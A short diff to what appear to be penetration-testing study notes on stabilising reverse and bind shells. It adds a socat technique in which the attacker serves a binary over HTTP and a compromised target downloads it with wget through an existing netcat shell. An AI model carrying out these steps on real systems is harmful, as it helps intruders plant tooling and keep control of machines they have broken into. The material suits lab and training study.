@@ -97,7 +97,15 @@ the seceond one is for bind shell
     
 This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use 
 
-    '''stty raw -echo; fg''' 
+    stty raw -echo; fg 
 
 to stabilise and re-enter the shell.
 
+**Technique 3: Socat**
+
+A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary 
+
+    sudo python3 -m http.server 80
+ then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget 
+
+    wget <LOCAL-IP>/socat -O /tmp/socat
